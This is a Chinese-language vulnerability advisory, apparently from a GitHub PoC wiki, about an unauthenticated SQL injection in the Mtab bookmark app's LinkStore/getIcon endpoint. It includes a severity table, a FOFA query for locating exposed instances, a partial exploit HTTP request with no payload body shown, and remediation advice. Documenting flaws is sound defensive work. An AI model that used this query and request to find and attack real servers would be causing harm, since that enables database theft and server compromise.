---
fofa: "title="
source: "SourByte05/Vulnerability-Wiki-PoC"
---

# Mtab书签导航程序 LinkStoregetIcon SQL注入漏洞

# 漏洞描述

Mtab书签导航程序 LinkStore/getIcon 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

影响版本

Mtab书签

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 高 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：title="Mtab书签"

POC/EXP：

POST /LinkStore/getIcon HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Content-Type: application/json
Connection: Keep-alive

![image-20240809093712788](./.resource/Mtab书签导航程序LinkStoregetIconSQL注入漏洞/media/image-20240809093712788.png)


![image-20240809093746807](./.resource/Mtab书签导航程序LinkStoregetIconSQL注入漏洞/media/image-20240809093746807.png)


![image-20240809100859661](./.resource/Mtab书签导航程序LinkStoregetIconSQL注入漏洞/media/image-20240809100859661.png)


# 修复方案

1. 关闭互联网暴露面或接口设置访问权限

   联系作者升级至安全版本
   
   https://github.com/tsxcw/mtab?tab=readme-ov-file


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
